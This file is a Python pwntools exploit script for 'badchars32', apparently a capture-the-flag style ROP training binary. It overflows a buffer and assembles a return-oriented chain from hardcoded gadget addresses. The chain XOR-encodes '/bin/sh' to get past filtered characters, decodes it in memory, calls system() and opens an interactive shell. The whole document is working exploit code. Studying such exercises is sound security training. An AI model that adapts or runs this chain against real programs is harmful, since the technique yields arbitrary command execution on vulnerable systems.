import sys
import struct
import pwn
from GizmoMaker import GizmoMaker


def write_string(gizmo_maker, method_name, start_addr: int, string: str):
    n = 4
    length = len(string)
    payload = b''
    for word in range(0, length, n):
        hexed = string[word:min(word + n, length)]
        to_addr = start_addr + word
        value = int("0x" + "".join([hex(ord(character))[2:] for character in hexed[::-1]]), 0)
        payload += gizmo_maker.execute(method_name, to_addr, value)
    return payload


e = pwn.ELF("badchars32")
written_addr = 0x804a038
print(hex(written_addr))
system = e.symbols[b'system']
bin_sh = 0xf7f1baaa
pop_edi_ret = 0x804889a

gizmo_maker = GizmoMaker(packer=pwn.p32)
template = gizmo_maker.get_template_template()
template["name"] = "arbitrary_write"
template["Constants"] = ["popper", "mover"]
template["Parameters"] = ["write_addr", "value"]
template["Queue"] = ["popper", "value", "write_addr", "mover"]
gizmo_maker.add_template(template)

template = gizmo_maker.get_template_template()
template["name"] = "xor_at_addr"
template["Constants"] = ["popper", "xor"]
template["Parameters"] = ["addr", "xor_val"]
template["Queue"] = ["popper", "addr", "xor_val", "xor"]
gizmo_maker.add_template(template)

# 0x08048899: pop esi; pop edi; ret;
# 0x08048893: mov dword ptr [edi], esi; ret;
gizmo_maker.init_template("arbitrary_write", 0x08048899, 0x08048893)

# 0x8048896:  pop ebx; pop ecx; ret;
# 0x8048890:  xor byte ptr [ebx], cl; ret;
gizmo_maker.init_template("xor_at_addr", 0x08048896, 0x08048890)

payload = b''
payload += ('D'*40).encode()
payload += ('B'*4).encode()

command = "/bin/sh"
command += "\x00"*(4-(len(command) % 4))

payload += write_string(gizmo_maker, "arbitrary_write", written_addr, pwn.xor(command, 0xfd).decode("ISO-8859-1"))

# makes the chain crazy long, could probably just write a loop in gadgets
for i in range(0, len(command)):
    payload += gizmo_maker.execute("xor_at_addr", written_addr + i, 0xffffff00 + 0xfd)


payload += pwn.p32(system)
payload += 'JJJJ'.encode()
payload += pwn.p32(written_addr)
payload += 'JJJJ'.encode()

payload += '\n'.encode()
sys.stdout.buffer.write(payload)
p = pwn.tubes.process.process(["./badchars32"], shell=True)
p.send_raw(payload)
p.interactive()
p.close()

